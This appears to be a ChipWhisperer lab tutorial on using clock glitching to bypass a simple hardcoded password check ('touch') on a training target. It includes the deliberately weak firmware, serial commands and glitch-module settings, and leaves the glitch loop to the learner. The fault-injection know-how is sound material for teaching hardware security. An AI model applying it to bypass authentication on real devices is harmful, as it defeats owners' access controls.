Part 1, Topic 2: Clock Glitching to Bypass Password
===================================================



**SUMMARY:** *In the previous lab, we learned how clock glitching can be
used to cause a target to behave unexpectedly. In this lab, we‚Äôll look
at a slightly more realistic example - glitching past a password check*

**LEARNING OUTCOMES:**

-  Applying previous glitch settings to new firmware
-  Checking for success and failure when glitching

Firmware
--------

We‚Äôve already seen how we can insert clock gliches to mess up a
calculation that a target is trying to make. While this has many
applications, some which will be covered in Fault_201, let‚Äôs take a look
at something a little closer to our original example of glitch
vulnerable code: a password check. No need to change out firmware here,
we‚Äôre still using the simpleserial-glitch project (though we‚Äôll go
through all the build stuff again).

The code is as follows for the password check:

.. code:: c

   uint8_t password(uint8_t* pw)
   {
       char passwd[] = "touch";
       char passok = 1;
       int cnt;

       trigger_high();

       //Simple test - doesn't check for too-long password!
       for(cnt = 0; cnt < 5; cnt++){
           if (pw[cnt] != passwd[cnt]){
               passok = 0;
           }
       }
       
       trigger_low();
       
       simpleserial_put('r', 1, (uint8_t*)&passok);
       return passok;
   }

There‚Äôs really nothing out of the ordinary here - it‚Äôs just a simple
password check. We can communicate with it using the ``'p'`` command.

If we send a wrong password:

    pw = bytearray([0x00]*5)
    target.simpleserial_write('p', pw)

We get a resposne of zero. But if we send the correct password:


**In [7]:**

.. code:: ipython3

    #Do glitch loop
    pw = bytearray([0x74, 0x6F, 0x75, 0x63, 0x68]) # correct password ASCII representation
    target.simpleserial_write('p', pw)
    
    val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check
    valid = val['valid']
    if valid:
        response = val['payload']

.. parsed-literal::

    {'valid': True, 'payload': CWbytearray(b'01'), 'full_response': 'r01\n', 'rv': 1}
    


We get a 1 back. Set the glitch up as in the previous part:


**In [8]:**

.. code:: ipython3

    scope.glitch.clk_src = 'clkgen'
    scope.glitch.trigger_src = 'ext_single'
    scope.glitch.repeat = 1
    scope.glitch.output = "clock_xor"
    scope.io.hs2 = "glitch"

Update the code below to also add an ext offset parameter:


**In [9]:**

.. code:: ipython3

    import matplotlib.pylab as plt
    import chipwhisperer.common.results.glitch as glitch
    gc = glitch.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset"])
    gc.display_stats()


**Out [9]:**













And make a glitch loop. Make sure you use some successful settings that
you found in the previous lab, since it will make this one much shorter!

One change you probably want to make is to add a scan for ext_offset.
The number of places we can insert a successful glitch has gone way
down. Doing this will also be very important for future labs.
